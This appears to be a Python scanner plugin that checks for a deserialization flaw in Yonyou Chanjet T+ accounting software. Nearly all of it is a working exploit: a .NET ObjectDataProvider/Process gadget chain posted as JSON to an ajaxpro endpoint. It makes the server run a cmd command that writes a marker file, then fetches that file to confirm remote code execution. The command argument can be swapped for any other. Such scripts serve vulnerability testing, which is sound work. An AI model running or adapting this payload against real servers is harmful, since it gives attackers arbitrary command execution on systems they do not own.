import requests
import urllib

def verify(url):
    relsult = {
        'name': '用友畅捷通RRATableController存在反序列化漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.3.4000 Chrome/30.0.1599.101 Safari/537.36',
        'Content-Type': 'application/json',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'close'
    }

    data = '''{
      "storeID":{
        "__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
        "MethodName":"Start",
        "ObjectInstance":{
            "__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
            "StartInfo": {
                "__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
                "FileName":"cmd", "Arguments":"/c echo Mcar3xb6G9iKuOvuuVOiQKodmT55AiNI > A13uD.txt"
           }
        }
      }
    }'''
    vurl = urllib.parse.urljoin(url, "/tplus/ajaxpro/Ufida.T.DI.UIP.RRA.RRATableController,Ufida.T.DI.UIP.ashx?method=GetStoreWarehouseByStore")
    try:
        response = requests.post(vurl, headers=headers, data=data)
        if response.status_code == 200:
            response = requests.get(url=url+'/tplus/A13uD.txt')
            if response.status_code == 200 and 'Mcar3xb6G9iKuOvuuVOiQKodmT55AiNI' in response.text:
                relsult['vulnerable'] = True
                relsult['verify'] = url+'/tplus/A13uD.txt'
        return relsult

    except:
        return relsult